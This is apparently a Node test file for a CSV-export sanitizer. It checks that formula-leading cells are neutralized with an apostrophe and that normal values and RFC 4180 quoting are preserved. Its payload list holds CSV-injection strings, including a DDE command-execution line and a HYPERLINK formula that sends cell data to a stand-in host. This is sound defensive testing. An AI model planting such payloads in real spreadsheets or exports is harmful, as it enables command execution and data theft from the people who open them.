// SPDX-License-Identifier: AGPL-3.0-or-later
import assert from 'node:assert/strict';
import test from 'node:test';
import { csvCell, csvCellQuoted, neutralizeCsvFormula } from './csv-safe.ts';

const PAYLOADS = [
  "=cmd|'/c calc'!A0",
  '=HYPERLINK("https://evil.example/?"&A1,"x")',
  '@SUM(1+9)*cmd',
  '+1+1',
  '-1+1',
  '-cmd',
  '  =1+1',
  ' @SUM(A1)',
  '\t=1+1',
  '\r=1+1',
  '\n=1+1',
  '\tplain',
  "'=already",
];

test('every formula lead is neutralized, behind whitespace and control characters too', () => {
  for (const p of PAYLOADS) {
    assert.equal(neutralizeCsvFormula(p), `'${p}`, JSON.stringify(p));
    assert.ok(csvCell(p).replace(/^"/u, '').startsWith("'"), JSON.stringify(p));
    assert.ok(csvCellQuoted(p).startsWith(`"'`), JSON.stringify(p));
  }
});

test('plain text and genuine numbers are untouched; RFC 4180 quoting applies', () => {
  for (const v of ['', 'ordinary', 'a-b', 'x=1', '-5', '-1.25', '+3e2', "'hello", "'-5"]) {
    assert.equal(neutralizeCsvFormula(v), v, JSON.stringify(v));
  }
  assert.equal(csvCell('a,"b"'), '"a,""b"""');
  assert.equal(csvCell('=a,b'), `"'=a,b"`);
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(-5), '-5');
});
